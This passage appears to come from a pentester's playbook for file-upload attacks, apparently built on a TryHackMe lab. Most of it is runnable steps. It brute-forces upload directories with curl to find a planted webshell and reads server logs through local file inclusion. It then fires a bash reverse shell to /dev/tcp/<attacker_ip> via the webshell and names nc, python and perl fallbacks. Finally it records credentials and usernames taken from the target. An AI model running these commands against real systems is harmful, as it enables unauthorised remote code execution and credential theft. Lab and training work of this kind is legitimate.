
Response body didn't reveal where the file landed. Try, in order:

1. **Inspect any app UI that lists / displays uploaded files** (profile page for profile-pic uploads, gallery for image uploads, dashboard for attachments). The path shown in `<img src>` / `<a href>` is the retrieval URL pattern.

2. **Guess common paths** — for each, `curl` for the exact filename you uploaded:

    ```bash
    UPLOAD_NAME='<uploaded_filename>'   # the filename you passed to try_upload as $2
    for guess_dir in /uploads /upload /files /media /attachments /user_files /profile_pics /avatars /images /static/uploads /assets/uploads /wp-content/uploads /storage/files; do
      status=$(curl -s -o /dev/null -w '%{http_code}' "${GET_FLAGS[@]}" "http://$HOST:$PORT$guess_dir/$UPLOAD_NAME")
      [ "$status" = "200" ] && echo "FOUND: $guess_dir/$UPLOAD_NAME"
    done
    ```

3. **Filename fuzzing** — if the app renamed the file (random hash / uniqid), grep the app's post-upload response for anything looking like a URL path, hash, or file identifier. If still nothing, gobuster the suspected upload dir with common filename patterns.

4. **Log inspection via LFI** (chained) — if any [[Local File Inclusion]] or [[Path Traversal]] surface exists elsewhere, read `/var/log/apache2/access.log` or `/var/log/nginx/access.log` for the POST-upload request → reveals server-side path.

If all four fail AND all sections returned only UNCLEAR/REJECTED → log `[File Upload] APPLIED: delivery-only; retrieval URL unknown` and treat as non-RCE per Section 6 disposition.

⚠️ If step 2 returns 401/403 across every candidate dir, session may have expired. If AW caller: re-derive `$COOKIES` (re-login) and re-assemble `GET_FLAGS`, then re-try.

---

## Reverse shell upgrade

RCE confirmed via GET-parameter command exec. Upgrade to interactive shell.

On attacker: `nc -lvnp <attacker_port>`

Trigger via the webshell:

```bash
curl -sG "${GET_FLAGS[@]}" "http://$HOST:$PORT$RETRIEVAL_PATH" \
  --data-urlencode "$CMD_PARAM=bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<attacker_port> 0>&1'"
```

curl's `--data-urlencode` handles all encoding — the single quotes, `&`, `>`, `/` are URL-encoded on the wire, then decoded by the server into `$_GET`, then passed to `system()` which runs the shell command.

⚠️ Bash reverse-shell requires bash on target. If target is minimal (Alpine / BusyBox / no bash), fall back to alternatives from [[Web Shells]] — `nc -e`, python one-liner, perl one-liner.

⚠️ Some webshells hang the parent request on long-running commands. If curl hangs after firing the payload, kill it with Ctrl+C — the shell is already backgrounded on target.

Callback received → [[Reverse Shell Stabilization]].

---

## Post-enum

RCE achieved:

- Log to `route_<ip>.txt`:

    ```bash
    printf '[File Upload] APPLIED: RCE at %s via section %s\n' "$RETRIEVAL_PATH" '<section>' >> route_<ip>.txt
    ```

- Foothold complete — return to [[MASTER WORKFLOW/Step 6. Vulnerability Analysis]] post-foothold path (privilege escalation, credential extraction).

Non-RCE hit (Section 6 branches):

- Log the specific chain outcome:

    ```bash
    printf '[File Upload] APPLIED: %s at %s via section %s\n' '<chain_class>' "$RETRIEVAL_PATH" '<section>' >> route_<ip>.txt
    ```

  `<chain_class>` = `stored-XSS` | `SSRF` | `XXE` | `filename-SQLi` | `filename-cmd-injection` | `symlink-file-read` | `zip-slip-RCE` | `path-traversal-write` | etc.

- Continue with the chained attack playbook if not already walked; return to caller after.

Any credentials / usernames leaked during chain (e.g., `/etc/passwd` via symlink → usernames):

- Append emails / usernames → `users_<host>.txt` per [[Web Attack Checksheet#Username accumulator convention]].
- Append credentials → `creds_<host>.txt` per [[Web Attack Checksheet#Credential accumulator convention]].

---

## Return

- RCE → return to caller with foothold. Caller (WAC or AW) halts unauth/authed walk; MASTER WORKFLOW resumes at post-foothold.
- Non-RCE hit → return to caller with the hit logged; caller continues its walk to remaining URLs / sub-blocks.
- No hits across all sections and URLs:

    ```bash
    printf '[File Upload] TESTED-NEGATIVE: no upload attack vectors succeeded across %d URLs\n' <count> >> route_<ip>.txt
    ```

    Return to caller.

---

## Validation

- THM:Guided Pentest: Web — 2026-09-11 — partial: pre-flight (Statefulness Probe, auth branch cookie handling, form metadata, POST/GET_FLAGS assembly, try_upload helper), Section 2a alt-extension bypass (`.phtml` bypassed filter → uploaded), Verify RCE (RCE confirmed `uid=33(www-data)`), Reverse shell upgrade (bash callback landed), [[Reverse Shell Stabilization]] → foothold → flag captured. Sections 1, 2b, 2c, 2d, 3, 4, 5, 6, 7 not exercised on this target.
